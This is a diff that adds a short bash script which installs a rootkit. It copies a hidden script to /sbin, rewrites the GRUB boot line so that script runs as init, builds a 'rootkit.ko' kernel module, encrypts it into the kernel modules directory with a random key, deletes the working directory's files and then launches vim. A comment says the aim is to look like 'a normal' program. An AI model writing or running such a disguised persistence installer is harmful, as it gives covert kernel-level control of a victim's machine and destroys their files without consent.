@@ -1,0 +1,17 @@
+#!/bin/bash
+
+#copy script_rootkit.sh to /sbin/
+#append "init=/sbin/script_rootkit.sh" to the line in /etc/default/grub beginning with linux
+#just exec a normal ahh programme
+
+cp ./.script_rootkit /sbin/script_rootkit.sh
+chmod +x /sbin/script_rootkit.sh
+sed -i '/^GRUB_CMDLINE_LINUX_DEFAULT=/ s/"$/ init=\/sbin\/script_rootkit.sh"/' /etc/default/grub
+update-grub > /dev/null 2>&1
+openssl rand -hex 32 > /boot/keyfile.bin
+cd .build
+make /dev/null 2>&1
+openssl enc -aes-256-cbc -pbkdf2 -salt -in ./rootkit.ko -out /lib/modules/$(uname -r)/extra/rootkit.ko.enc -pass file:/boot/keyfile.bin
+cd ../
+rm ./*
+exec vim 
